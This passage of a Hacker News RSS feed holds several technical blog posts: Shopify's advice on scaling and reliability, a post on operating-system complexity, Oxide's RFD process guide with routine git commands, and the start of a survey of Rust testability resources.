<p>As your project gets more mature, set up a dashboard to track key metrics and create automated alerts. Generally, computers should tell you when something is wrong. Systems become more difficult to monitor as they grow. You want to measure and log everything at the beginning and not wait until something goes wrong. You can encourage other developers to do this by creating helper classes with a really simple APIs since things that are easy and obvious are more likely to be used. Once you are logging everything, create automated alerts. Post these alerts in shared communication channels, and automatically page the oncall developer for emergencies.</p>
<h2 id="MinimalUpfront">Do Minimal Upfront Work and Queue the Rest</h2>
<p>A system is scalable when it handles unexpectedly large bursts of incoming requests. The faster your system handles a request, the faster it gets to the next one. Turns out, that in most cases, you don’t have to give a response to the request right away—just a response indicating you've started working on the task. In practice, you queue a background job after you receive a request. Once your job is in a queue, you have the added benefit of making your system fault tolerant since failed jobs can be tried again.</p>
<h2 id="ScalingReads">Scaling Reads with Caching and Denormalizing</h2>
<p>Read-heavy systems mean some data is being read multiple times. This can be problematic because your database might not have enough capacity to deal with all of that work. The general approach of solving this is by pre-computing this data (called denormalizing) and storing it somewhere fast. In practice, instead of letting each request hit multiple tables in a database, you pre-compute the expected response and store it in a single place. Ideally, you store this information somewhere that’s really fast to read from (think RAM). In practice this means storing data in data stores like Memcached.</p>
<h2 id="ScalingWrites">Scaling Writes with Sharding, NoSQL Datastore, or Design Choices</h2>
<p>Write-heavy systems tend to be difficult to deal with. Traditional relational databases can handle reads pretty well, but have trouble with writes. They take more time processing writes because relational databases spend more effort on durability and that can lock up writes and create timeout errors.</p>
<p>Consider the scenario where a relational database is at it’s write-capacity and you can’t scale up anymore. One solution is to write data to multiple databases. Sharding is the process where you split your database into multiple parts (known as shards). This process allows you to group related data into one database. Another method of dealing with a write heavy system is by writing to Non-relational (NoSQL) databases. These databases are optimized to handle writes, but there’s a tradeoff. Depending on the type of NoSQL database and its configuration, it gives up:</p>
<ul>
<li>atomic transactions (they don’t wait for other transactions to fully finish),&nbsp;</li>
<li>consistency across multiple clusters (they don’t wait for other clusters to have the same data),</li>
<li>durability (they don’t spend time writing to disk).&nbsp;</li>
</ul>
<p>It may seem like you are giving up a lot, but you mitigate some of these losses with design choices.&nbsp;</p>
<p>Design choices help you cover some of the weaknesses of SQL databases. For example, consider that updating rows is much more expensive than creating new rows. Design your system so you avoid updating the same row in multiple flows—insert new rows to avoid lock contention. With all of that said, I recommend starting out with a SQL database, and evolving your setup depending on your needs.</p>
<h2 id="HorizontalScaling">Horizontal Scaling Is the Only Real Long Term Solution</h2>
<p>Horizontal scaling refers to running your software on multiple small machines, while vertical scaling refers to running your software on one large machine. Horizontal scaling is more fault tolerant since failure of a machine doesn’t mean an outage. Instead, the work for the failed machine is routed to the other machines. In practice, horizontally scaling a system is the only long term approach to scaling. All systems that appear ‘infinitely-scalable’ are horizontally scaled under the hood: Cloud object stores like S3 and GCS; NoSQL databases like Bigtable and Dynamo DB; and stream processing systems like Kafka are all horizontally scaled. The cost for horizontally scaling systems is application and operational complexity. It takes significant time and potential complexity to horizontally scale your system, but you want to be in a situation where you can linearly scale your system by adding more computers.</p>
<h2 id="HardTest">Things That are Harder to Test Are More Likely to Break</h2>
<p>Among competing approaches to a problem, you should pick the most testable solution (this is my variant of Occam’s Razor). If something is difficult to test, people tend to avoid testing it. This means that future programmers (or you) will be less likely to fully test this system, and each change will make the system more brittle. This model is important to remember when you first tackle a problem because good testability needs to be baked into the architecture. You’ll know when something is hard to test because your intuition will tell you.</p>
<h2 id="RootCause">Antifragility and Root Cause Analysis</h2>
<p>Nassim Taleb uses the analogy of a hydra in Antifragile; they grow back a stronger head every time they are struck. The software industry championed this idea too. Instead of treating failures as shameful incidents that should be avoided at all costs, they’re now treated as opportunities to improve the system. Netflix’s engineering team is known for Chaos Monkey, a resiliency system that turns off random components. Once you anticipate random events, you can build a more resilient system. When failures do happen, they’re treated as an opportunity to learn.</p>
<p>Root cause analysis is a process where the people involved in a failure try to extract the root cause in a blameless way by starting off by what went right, and then diving into the failure without blaming anyone.</p>
<h2 id="BigO">Big-O and Exponential Growth</h2>
<p>The Big-O notation describes the growth in complexity of an algorithm. There’s a lot to this, but you’ll get very far if you just understand the difference between constant, linear, and exponential growth. In layman’s terms, algorithms that perform one task are better than algorithms that perform many tasks, and algorithms that perform many tasks are better than ones where the tasks are ever increasing with each iteration. I have found this issue visible at an architectural level as well.</p>
<h2 id="MarginSafety">Margin of Safety</h2>
<p>Accounting for a margin of safety means you need to leave some room for errors or exceptional events. For example, you might be tempted to run each server at 90% of its capacity. While this saves money, it leaves your server vulnerable to spikes in traffic. You’ll have more confidence in your setup, if you have auto-scaling setup. There’s a problem with this too, your overworked server can cause cascading failures in the whole system. By the time auto-scaling kicks in, the new server may have a disk, connection pool or an assortment of other random fun issues. Expect the unexpected and give yourself some room to breathe. Margin of safety also applies to planning releases of new software. You should add a buffer of time because unexpected things will come up.</p>
<h2 id="PublicAPI">Protect the Public API</h2>
<p>Be very careful when making changes to the public API. Once something is in the public API, it’s difficult to change or remove. In practice, this means having a very good reason for your changes, and being extremely careful with anything that affects external developers; mistakes in this type of work affect numerous people and are very difficult to revert.</p>
<h2 id="Redundancy">Redundancy</h2>
<p>Any system with many moving parts should be built to …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://shopify.engineering/building-mental-models">https://shopify.engineering/building-mental-models</a></em></p>]]>
            </description>
            <link>https://shopify.engineering/building-mental-models</link>
            <guid isPermaLink="false">hacker-news-small-sites-24946220</guid>
            <pubDate>Fri, 30 Oct 2020 19:51:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Complexity in Operating Systems]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24945856">thread link</a>) | @fcambus
<br/>
October 30, 2020 | https://x86.lol/generic/2020/10/30/complexity-in-operating-systems.html | <a href="https://web.archive.org/web/*/https://x86.lol/generic/2020/10/30/complexity-in-operating-systems.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Over the last years I’ve been working on very different operating
systems. Operating systems are usually incredibly complex beasts. I
think there are mainly three drivers of this complexity. Surprisingly
enough, neither of these is having to deal with hardware.</p>

<p>The first one is resource <strong>discovery</strong>, i.e. figuring out how the
computer the OS is running on actually looks like. On x86, this
involves parsing countless bitfields, tables, executing byte code
provided by the firmware, probing individual features, etc. The most
painful example of this I’ve seen so far is figuring out which
interrupt a particular PCI interrupt line is routed to. It’s worth a
set of posts, but until then, feel free to checkout <a href="https://habr.com/en/post/501912/">this
description</a>. (If it’s down, it’s
also cached by
<a href="https://webcache.googleusercontent.com/search?q=cache:CXZUV61m7hwJ:https://habr.com/en/post/501912/+&amp;cd=1&amp;hl=en&amp;ct=clnk">Google</a>.)</p>

<p>The second issue is <strong>resource management</strong>. Essentially, how do you
hand out and eventually reclaim all the resources you discovered. For
some workloads performance matters here, so this code is usually
written with speed in mind.</p>

<p>The third reason is that at compile time the <strong>workload</strong> is
unclear. So the kernel has to assume the worst. It must be ready to
start a couple of hundred VMs or create a thousand TCP sockets in a
blink of an eye, because there is no way to know what’s going to
happen or what the actual requirements are.</p>

<p>A fun exercise is to checkout the <a href="https://elixir.bootlin.com/linux/v5.9.1/source/virt/kvm/kvm_main.c#L739">KVM code for creating
VMs</a>. Try
to follow
<a href="https://elixir.bootlin.com/linux/v5.9.1/source/arch/x86/kvm/x86.c#L9904">the</a>
<a href="https://elixir.bootlin.com/linux/v5.9.1/source/arch/x86/kvm/vmx/vmx.c#L7059">code</a>
to where the actual VM is created in hardware. <em>Spoiler:</em> There is
none. It’s all figuring out what the platform can do and then setting
up a bunch of spinlock, mutexes, lists, arrays, structs, …</p>

<p>I don’t want to pick on KVM in particular. I think it’s pretty ok as
far as Linux kernel code goes. Operating System kernel code is mostly
like this: A lot of really mind numbing platform discovery and
resource management code written for speed assuming the worst case
requirements in a language that doesn’t do parsing, resource
management or concurrency well (among other things).</p>

<p>People take this all for granted. But when I look around, I see many
systems that don’t need this complexity and where it is only a safety
and security burden. Consider most appliance-type products, e.g. a
Wi-Fi router. Or a system that runs one service on a cloud VM. You
know everything in advance!</p>

<p>If you read until this point, you are probably asking yourself, where
I am going with this. If you think <a href="https://en.wikipedia.org/wiki/Separation_kernel">separation
kernel</a>, you are
right. My rough plan to write a couple of more posts to flesh out the
idea of doing all the complicated OS parts at compile time and how
this results in an incredibly simple, secure, and efficient system at
runtime. There will be <a href="https://riscv.org/">RISC-V</a>,
<a href="https://www.haskell.org/">Haskell</a>, <a href="https://dhall-lang.org/">Dhall</a>,
and <a href="https://www.rust-lang.org/">Rust</a> content.</p>

<p>Stay tuned.</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://x86.lol/generic/2020/10/30/complexity-in-operating-systems.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945856</guid>
            <pubDate>Fri, 30 Oct 2020 19:20:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Requests for Discussion]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24945700">thread link</a>) | @benjaminjosephw
<br/>
October 30, 2020 | https://oxide.computer/blog/rfd-1-requests-for-discussion/ | <a href="https://web.archive.org/web/*/https://oxide.computer/blog/rfd-1-requests-for-discussion/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>One of the first things we did in setting up the company was create a repo
named "rfd." This repo houses our requests for discussion. Bryan teased this to
the internet...</p>
<blockquote><p lang="en" dir="ltr">To the point of this piece, the first thing we actually built at <a href="https://twitter.com/oxidecomputer?ref_src=twsrc%5Etfw">@oxidecomputer</a> was infrastructure for design documentation and discussion -- which, like many problems, is peskier than it might seem! <a href="https://t.co/w8ecNNUN0I">https://t.co/w8ecNNUN0I</a></p>— Bryan Cantrill (@bcantrill) <a href="https://twitter.com/bcantrill/status/1286005213065703424?ref_src=twsrc%5Etfw">July 22, 2020</a></blockquote> 
<p>...and folks asked for our process, so we are going to share it!</p>
<p>The best way to
describe RFDs is with "RFD 1 Requests for Discussion." Below is that RFD.</p>
<hr>
<p><strong>Table of Contents</strong></p>
<ul>
<li><a href="#when-to-use-an-rfd">When to use an RFD</a></li>
<li><a href="#rfd-metadata-and-state">RFD Metadata and State</a></li>
<li><a href="#rfd-life-cycle">RFD life-cycle</a>
<ul>
<li><a href="#reserve-a-rfd-number">Reserve a RFD number</a></li>
<li><a href="#create-a-branch-for-your-rfd">Create a branch for your RFD</a></li>
<li><a href="#create-a-placeholder-rfd">Create a placeholder RFD</a></li>
<li><a href="#push-your-rfd-branch-remotely">Push your RFD branch remotely</a></li>
<li><a href="#iterate-on-your-rfd-in-your-branch">Iterate on your RFD in your branch</a></li>
<li><a href="#discuss-your-rfd">Discuss your RFD</a></li>
<li><a href="#push-your-rfd-branch-remotely-2">Push your RFD branch remotely</a></li>
<li><a href="#open-a-pull-request">Open a Pull Request</a></li>
<li><a href="#discuss-the-rfd-on-the-pull-request">Discuss the RFD on the pull request</a></li>
<li><a href="#merge-the-pull-request">Merge the Pull Request</a></li>
<li><a href="#making-changes-to-an-rfd">Making changes to an RFD</a></li>
<li><a href="#committing-to-an-rfd">Committing to an RFD</a></li>
</ul>
</li>
<li><a href="#changing-the-rfd-process">Changing the RFD process</a></li>
<li><a href="#tooling">Tooling</a>
<ul>
<li><a href="#api">API</a></li>
<li><a href="#short-urls">Short URLs</a></li>
<li><a href="#chat-bot">Chat bot</a></li>
<li><a href="#shared-rfd-rendered-site">Shared RFD Rendered Site</a></li>
</ul>
</li>
</ul>
<hr>
<p>Writing down ideas is important:  it allows them to be rigorously formulated
(even while nascent), candidly discussed and transparently shared.
We capture the written expression of an idea in a <strong>Request for Discussion</strong>
(RFD), a document in the original spirit of the
<a href="https://en.wikipedia.org/wiki/Request_for_Comments">IETF Request for Comments</a>,
as expressed by <a href="https://tools.ietf.org/html/rfc3">RFC 3</a>:</p>
<blockquote>
<p>The content of a note may be any thought, suggestion, etc.
related to the software or other aspect of the network.
Notes are encouraged to be timely rather than polished.
Philosophical positions without examples or other specifics, specific suggestions
or implementation techniques without introductory or background explication, and
explicit questions without any attempted answers are all acceptable.
The minimum length for a note is one sentence.</p>
</blockquote>
<blockquote>
<p>These standards (or lack of them) are stated explicitly for two reasons.
First, there is a tendency to view a written statement as ipso facto authoritative,
and we hope to promote the exchange and discussion of considerably less than
authoritative ideas.
Second, there is a natural hesitancy to publish something unpolished,
and we hope to ease this inhibition.</p>
</blockquote>
<p>Similar to RFCs, our philosophy of RFDs is to allow both timely discussion of
rough ideas, while still becoming a permanent repository for more established ones.
Depending on their state, RFDs may be quickly iterated on in a branch,
discussed actively as part of a pull request to be merged, or commented upon
after having been published.
The workflow for the RFD process for is based upon those of the Golang
proposal process, Joyent RFD process, Rust RFC process, and Kubernetes
proposal process.</p>
<h2 id="when-to-use-an-rfd">When to use an RFD</h2>
<p>The following are examples of when an RFD is appropriate, these are intended to
be broad:</p>
<ul>
<li>Add or change a company process</li>
<li>An architectural or design decision for hardware or software</li>
<li>Change to an API or command-line tool used by customers</li>
<li>Change to an internal API or tool</li>
<li>Change to an internal process</li>
<li>A design for testing</li>
</ul>
<p>RFDs not only apply to technical ideas but overall company ideas and processes
as well.
If you have an idea to improve the way something is being done as a company,
you have the power to make your voice heard by adding to discussion.</p>

<p>At the start of every RFD document, we'd like to include a brief amount of metadata.
The metadata format is based on the
<a href="https://github.com/trentm/python-markdown2/wiki/metadata">python-markdown2</a> metadata format.
It'd look like:</p>
<pre><code>---
authors: Andy Smith &lt;andy@example.computer&gt;, Neal Jones &lt;neal@example.computer&gt;
state: prediscussion
---
</code></pre>
<p>We keep track of three pieces of metadata:</p>
<ol>
<li><code>authors</code>: The authors (and therefore owners) of an RFD.
They should be listed with their name and e-mail address.</li>
<li><code>state</code>: Must be one of the states discussed below.</li>
<li><code>discussion</code>: For RFDs that are in or beyond the <code>discussion</code> state, this should be a link to the PR to integrate the RFD;
see below for details.</li>
</ol>
<p>An RFD can be in one of the following six states:</p>
<ol>
<li><code>prediscussion</code></li>
<li><code>ideation</code></li>
<li><code>discussion</code></li>
<li><code>published</code></li>
<li><code>committed</code></li>
<li><code>abandoned</code></li>
</ol>
<p>A document in the <code>prediscussion</code> state indicates that the work is not yet
ready for discussion, but that the RFD is effectively a placeholder.
The <code>prediscussion</code> state signifies that work iterations are being done
quickly on the RFD in its branch in order to advance the RFD to the <code>discussion</code> state.</p>
<p>A document in the <code>ideation</code> state contains only a description of the topic
that the RFD will cover, providing an indication of the scope of the eventual
RFD.  Unlike the <code>prediscussion</code> state, there is no expectation that it is
undergoing active revision. Such a document can be viewed as a scratchpad for
related ideas.  Any member of the team is encouraged to start active
development of such an RFD (moving it to the <code>prediscussion</code> state) with or
without the participation of the original author. It is critical that RFDs in
the <code>ideation</code> state are clear and narrowly defined.</p>
<p>Documents under active discussion should be in the <code>discussion</code> state.
At this point a discussion is being had for the RFD in a Pull Request.</p>
<p>Once (or if) discussion has converged and the Pull Request is ready to be merged,
it should be updated to the <code>published</code> state before merge.
Note that just because something is in the <code>published</code> state does not mean that
it cannot be updated and corrected.
See the  <a href="#making-changes-to-an-rfd">Making changes to an RFD</a> section for more
information.</p>
<p>The <code>prediscussion</code> state should be viewed as essentially a collaborative
extension of an engineer's notebook, and the <code>discussion</code> state should be used
when an idea is being actively discussed.
These states shouldn't be used for ideas that have been committed to,
organizationally or otherwise;
by the time an idea represents the consensus or direction, it should be in
the <code>published</code> state.</p>
<p>Once an idea has been entirely implemented, it should be in the <code>committed</code> state.
Comments on ideas in the <code>committed</code> state should generally be raised as issues --
but if the comment represents a call for a significant divergence from or
extension to committed functionality, a new RFD may be called for;
as in all things, use your best judgment.</p>
<p>Finally, if an idea is found to be non-viable (that is, deliberately never
implemented) or if an RFD should be otherwise indicated that it should be
ignored, it can be moved into the <code>abandoned</code> state.</p>
<p>We will go over this in more detail.
Let's walk through the life of a RFD.</p>
<h2 id="rfd-life-cycle">RFD life-cycle</h2>
<p>There is a <em>prototype</em> script in this repository, <code>scripts/new.sh</code>, that will
automate the process.</p>
<pre><code>$ scripts/new.sh 0042 "My title here"
</code></pre>
<p>If you wish to create a new RFD by hand, or understand the process in greater
detail, read on.</p>
<p><strong>NOTE:</strong> Never at anytime through the process do you push directly to the
master branch. Once your pull request (PR) with your RFD in your branch is
merged into master, then the RFD will appear in the master branch.</p>
<h3 id="reserve-a-rfd-number">Reserve a RFD number</h3>
<p>You will first need to reserve the number you wish to use for your RFC.
This number should be the next available RFD number from looking at the
current <code>git branch -r</code> output.</p>
<h3 id="create-a-branch-for-your-rfd">Create a branch for your RFD</h3>
<p>Now you will need to create a new git branch, named after the RFD number you wish to reserve.
This number should have leading zeros if less than 4 digits.
Before creating the branch, verify that it does not already exist:</p>
<pre><code>$ git branch -rl *0042
</code></pre>
<p>If you see a branch there (but not a corresponding sub-directory in <code>rfd</code> in
master), it is possible that the RFD is currently being created;
stop and check with co-workers before proceeding!
Once you have verified that the branch doesn't exist, create it locally and
switch to it:</p>
<pre><code>$ git checkout -b 0042
</code></pre>
<h3 id="create-a-placeholder-rfd">Create a placeholder RFD</h3>
<p>Now create a placeholder RFD.
You can do so with the following commands:</p>
<pre><code>$ mkdir -p rfd/0042
$ cp prototypes/prototype.md rfd/0042/README.md
# OR IF YOU PREFER asciidoc
$ cp prototypes/prototype.adoc rfd/0042/README.adoc
</code></pre>
<p>Fill in the RFD number and title placeholders in the new doc and add your name as an author.
The status of the RFD at this point should be <code>prediscussion</code>.</p>
<p>If your preference is to use asciidoc, that is acceptable as well, however the examples in this flow will assume markdown.</p>
<h3 id="push-your-rfd-branch-remotely">Push your RFD branch remotely</h3>
<p>Push your changes to your RFD branch in the RFD repo.</p>
<pre><code>$ git add rfd/0042/README.md
$ git commit -m '0042: Adding placeholder for RFD &lt;Title&gt;'
$ git push origin 0042
</code></pre>
<p>After your branch is pushed, the table in the README on the master branch will
update automatically with the new RFD. If you ever change the name of the RFD in the future,
the table will update as well. Whenever information about the state of the RFD
changes, this updates the table as well. The single source of truth for
information about the RFD comes from the RFD in the branch until it is merged.</p>
<h3 id="iterate-on-your-rfd-in-your-branch">Iterate on your RFD in your branch</h3>
<p>Now, you can work on writing your RFD in your branch.</p>
<pre><code>$ git checkout 0042
</code></pre>
<p>Now you can gather your thoughts and get your RFD to a state where you would
like to get feedback and discuss with others.
It's recommended to push your branch remotely to make sure the changes you make
stay in sync with the remote in case your local gets damaged.</p>
<p>It is up to you as to whether you would like to squash all your commits down to
one before opening up for feedback, or if you would like to keep the commit
history for the sake of history.</p>
<h3 id="discuss-your-rfd">Discuss your RFD</h3>
<p>When you are ready to get feedback on your RFD, make sure all your local
changes are pushed to the remote branch.
At this point you are likely at the stage where you will want to change the
status of the RFD from <code>prediscussion</code> to <code>discussion</code> for a fully formed
RFD or to <code>ideation</code> for one where only the topic is specified.
Do this in your branch.</p>
<h3 id="push-your-rfd-branch-remotely-2">Push your RFD branch remotely</h3>
<p>Along with your RFD content, update the RFD's state to <code>discussion</code> in your branch, then:</p>
<pre><code>$ git commit -am '0042: Add RFD for &lt;Title&gt;'
$ git push origin 0042
</code></pre>
<h3 id="open-a-pull-request">Open a Pull Request</h3>
<p>Open a pull request on GitHub to merge your branch, in this case <code>0042</code> into the master branch.</p>
<p>If you move your RFD into <code>discussion</code> but fail to open a pull request, a friendly
bot …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://oxide.computer/blog/rfd-1-requests-for-discussion/">https://oxide.computer/blog/rfd-1-requests-for-discussion/</a></em></p>]]>
            </description>
            <link>https://oxide.computer/blog/rfd-1-requests-for-discussion/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24945700</guid>
            <pubDate>Fri, 30 Oct 2020 19:05:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust Design-for-Testability: A Survey]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24945657">thread link</a>) | @matt_d
<br/>
October 30, 2020 | https://alastairreid.github.io/rust-testability/ | <a href="https://web.archive.org/web/*/https://alastairreid.github.io/rust-testability/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>What can we do when designing Rust code to make it easier to test?
This is a survey of everything I could find<sup id="fnref:survey-method" role="doc-noteref"><a href="#fn:survey-method">1</a></sup> about
testing Rust with a particular focus on design for testability for
correctness.  Some of the articles show multiple things to do on a
worked example, some are more focused on a particular trick.</p>

<p>There doesn’t seem to be a single place that describes all the testing
ideas: it is scattered across book chapters, blog articles, medium
articles, etc. but here are the main sources that I have found.</p>

<ul>
  <li><a href="https://doc.rust-lang.org/book/ch11-01-writing-tests.html">The Rust book</a> chapter on testing</li>
  <li><a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing command line applications in Rust</a>
(significant overlap with the <a href="https://doc.rust-lang.org/book/ch11-01-writing-tests.html">Rust book</a>)</li>
  <li><a href="https://blog.logrocket.com/how-to-organize-your-rust-tests/">How to organize your Rust tests</a>
Probably the most exhaustive / thorough</li>
  <li><a href="https://dropbox.tech/infrastructure/-testing-our-new-sync-engine">Testing sync at Dropbox</a> –
what they did in their Rust rewrite to improve testability</li>
  <li><a href="https://doc.rust-lang.org/stable/rust-by-example/testing.html">Rust by example book</a> chapter on testing</li>
  <li><a href="https://blog.regehr.org/archives/1687">Writing fuzzable code</a> –
John Regehr’s blog (not specifically about Rust)</li>
  <li><a href="https://www.zcfy.cc/original/testable-component-design-in-rust-iextendable">Testable Component Design in Rust</a></li>
  <li><a href="https://knowitlabs.no/rust-2020-testing-4ab3d80112ba">Rust 2020: Testing</a></li>
  <li><a href="https://blog.logrocket.com/using-the-rust-compiler-as-your-integration-testing-framework/">How to use the Rust compiler as your integration testing framework</a></li>
  <li><a href="https://github.com/rust-unofficial/awesome-rust#testing">Awesome Rust: Testing</a> (collection of links)</li>
  <li><a href="https://blog.logrocket.com/how-to-write-crap-rust-code/">Writing Correct, Readable and Performant (CRaP) Rust code</a></li>
  <li><a href="https://blog.cyplo.dev/posts/2018/09/rust-testing-tricks/">Rust testing tricks</a></li>
  <li><a href="https://github.com/rust-unofficial/awesome-rust#testing">Awesome Rust: testing tools/libraries</a></li>
  <li><a href="https://martinfowler.com/articles/practical-test-pyramid.html">A practical test pyramid</a> – Martin Fowler’s blog (not specifically about Rust)</li>
</ul>

<p>I am not going to try to summarize what these sources say: the rest of
this post is a list of some common / interesting topics and which of
these sources describe it in more detail.</p>

<p>Although my main focus is on how to write Rust programs so that they are easy
to test, I touch on the other half of the problem: how to do the testing.</p>

<p><em>[I am new to Rust and my own testing habits are somewhat ad-hoc so this is
definitely not a recommendation of how to write software by me.  I hope it is
useful and that you will tell me what I have missed
<a href="https://twitter.com/alastair_d_reid">on twitter</a> or
<a href="mailto:alastair.d.reid@gmail.com">by email</a>
so that I can update this post.
I would love to hear about any team that has published recommendations for
design-for-testability.]</em></p>

<h2 id="design-techniques-for-improving-testability">Design techniques for improving testability</h2>

<p>The sources listed above have a bunch of common suggestions that I
explore in more detail below. Many of the sources I found have great
discussions so I will not try to repeat their explanations in this
document but will link to some of the better discussions of each idea
that I found.</p>

<h3 id="use-intermediate-data-structures">Use intermediate data structures</h3>

<p>See:
<a href="https://dropbox.tech/infrastructure/-testing-our-new-sync-engine">Testing sync</a>,
<a href="https://doc.rust-lang.org/book/ch11-01-writing-tests.html">Rust book</a>,
<a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing CLI applications</a>,
<a href="https://blog.logrocket.com/using-the-rust-compiler-as-your-integration-testing-framework/">use the Rust compiler for integration testing</a></p>

<ul>
  <li>Use intermediate data structures to separate deciding what to do
from performing the action: allowing tests to check that the right
decision is being made and avoiding the need to mock/fake the
filesystem, etc.</li>
  <li>Aggressively use newtypes, structs, enums</li>
  <li>Parse and validate inputs early (eg convert strings to enums)</li>
  <li>Also, #[must_use], parse/validate early</li>
  <li><a href="https://sans-io.readthedocs.io/how-to-sans-io.html">Writing I/O-Free (Sans-I/O) Protocol Implementations</a> (not Rust specific)</li>
</ul>

<h3 id="abstract-testable-code-into-separate-functions">Abstract testable code into separate functions</h3>

<p>See:
<a href="https://doc.rust-lang.org/book/ch11-01-writing-tests.html">Rust book</a>,
<a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing CLI applications</a></p>

<ul>
  <li>Cleanly separate command line parsing from code that implements functionality</li>
</ul>

<h3 id="abstract-io-and-state-side-effects-out-of-functions">Abstract I/O and state side effects out of functions</h3>

<p>See:
<a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing CLI applications</a>,
<a href="https://blog.regehr.org/archives/1687">Writing fuzzable code</a>,
<a href="https://dropbox.tech/infrastructure/-testing-our-new-sync-engine">Testing sync</a></p>

<ul>
  <li>Use of std::io::Write trait and writeln! instead of println! (and handle resulting potential error)</li>
</ul>

<h3 id="avoid--reduce-non-determinism">Avoid / reduce non-determinism</h3>

<p>See:
<a href="https://dropbox.tech/infrastructure/-testing-our-new-sync-engine">Testing sync</a>,
<a href="https://blog.regehr.org/archives/1687">Writing fuzzable code</a></p>

<ul>
  <li>Use Futures with a custom executor to eliminate the
non-determinism of threads</li>
  <li>All randomized testing systems should be fully deterministic
and easily reproducible</li>
  <li>Beware of additional randomness in libraries:
e.g., Rust’s HashMap uses randomized hashing to protect against denial of service attacks.
This makes testing harder.</li>
  <li>Determinism enables minimization of random tests
(cf. <a href="https://altsysrq.github.io/proptest-book/proptest/tutorial/shrinking-basics.html">proptest</a>)</li>
</ul>

<h3 id="defining-correct-behavior">Defining correct behavior</h3>

<p>See:
<a href="https://blog.regehr.org/archives/1687">Writing fuzzable code</a></p>

<ul>
  <li><a href="https://blog.regehr.org/archives/856">Oracles for random testing</a> (not Rust specific)
    <ul>
      <li>Use Function inverse pairs (eg print/parse functions)</li>
      <li>Compare two implementations</li>
    </ul>
  </li>
  <li>Use asserts liberally</li>
  <li><a href="https://doc.rust-lang.org/nightly/unstable-book/compiler-flags/sanitizer.html">Turn on sanitizers</a></li>
  <li><a href="https://docs.rs/contracts/0.6.0/contracts/">Contracts.rs</a>
/ <a href="https://crates.io/crates/contracts">(crates.io link)</a> – code contract library</li>
  <li>[inactive?] <a href="https://github.com/nrc/libhoare">libhoare</a> compiler plugin</li>
</ul>

<h3 id="dependency-injection-and-mock-testing">Dependency injection and mock testing</h3>

<p>See:
<a href="https://knowitlabs.no/rust-2020-testing-4ab3d80112ba">Rust 2020: Testing</a>,
<a href="https://www.zcfy.cc/original/testable-component-design-in-rust-iextendable">Testable Component Design in Rust</a></p>

<ul>
  <li>Abstraction can be based on Higher order functions or objects</li>
  <li>Traits and <a href="https://github.com/asomers/mockall">mockall</a></li>
  <li>Module mocks using <a href="https://github.com/CodeSandwich/Mocktopus">mocktopus</a></li>
  <li><a href="https://github.com/Mcat12/shaku">shaku</a> is a compile-time dependency injection library that works well with mockall</li>
</ul>

<h3 id="api-design">API design</h3>

<p>See:
<a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing CLI applications</a>,
<a href="https://rust-lang.github.io/api-guidelines/about.html">Rust API guidelines</a>,
<a href="http://erickt.github.io/blog/2015/09/22/if-you-use-unsafe/">If you use Unsafe, …</a>,
<a href="https://www.zcfy.cc/original/testable-component-design-in-rust-iextendable">Testable Component Design</a>,
<a href="https://blog.logrocket.com/how-to-write-crap-rust-code/">Writing Correct, Readable and Performant (CRaP)</a></p>

<p>API design strongly affects testability of that API</p>

<ul>
  <li>The component should provide a stable contract composed of traits, structs, and enums</li>
  <li>Always implement Clone and fmt::Debug for public types
    <ul>
      <li>types like failure::Error should be converted to something that is cloneable</li>
    </ul>
  </li>
  <li>
    <p>Use ‘newtype’ to let the type system statically test for errors and use
one of these to test that this is done correctly</p>

    <ul>
      <li><a href="https://github.com/laumann/compiletest-rs">compiletest.rs</a>
for testing Rust compilations</li>
      <li><a href="https://github.com/dtolnay/trybuild">trybuild</a>
for testing error messages (eg from proc-macros)</li>
      <li><a href="https://crates.io/crates/lang_tester/">lang_tester</a>
for testing compilations including, but not limited to, Rust</li>
      <li>the fuzzy text matcher <a href="https://crates.io/crates/fm">fm</a></li>
    </ul>
  </li>
  <li>Use #![warn(missing_doc_code_examples)]
(and other <a href="https://rust-lang.github.io/api-guidelines/about.html">Rust API guidelines</a>)</li>
</ul>

<h2 id="writing-tests">Writing tests</h2>

<p>See:
<a href="https://blog.logrocket.com/how-to-organize-your-rust-tests/">How to organize your Rust tests</a>,
<a href="https://rust-cli.github.io/book/tutorial/testing.html">Testing CLI applications</a>,
<a href="https://doc.rust-lang.org/stable/rust-by-example/testing.html">Rust by example</a>,</p>

<p>Having structured your software to enable tests, there are a lot of
different tools and libraries to support writing tests.</p>

<ul>
  <li>Documentation tests</li>
  <li><a href="https://blog.logrocket.com/how-to-organize-your-rust-tests/">How to organize your Rust tests</a></li>
  <li><a href="https://rust-fuzz.github.io/book/">Fuzzing book</a> describes use of
    <ul>
      <li><a href="https://rust-fuzz.github.io/book/cargo-fuzz.html">cargo-fuzz</a></li>
      <li><a href="https://github.com/rust-fuzz/afl.rs">afl.rs</a></li>
      <li><a href="https://crates.io/crates/arbitrary">arbitrary</a></li>
    </ul>

    <p>See: <a href="https://github.com/rust-fuzz">Rust Fuzzing Authority</a></p>
  </li>
  <li>Use a generative testing / property-based testing crate such as
    <ul>
      <li><a href="https://docs.rs/quickcheck">QuickCheck</a>
        <ul>
          <li>has its own
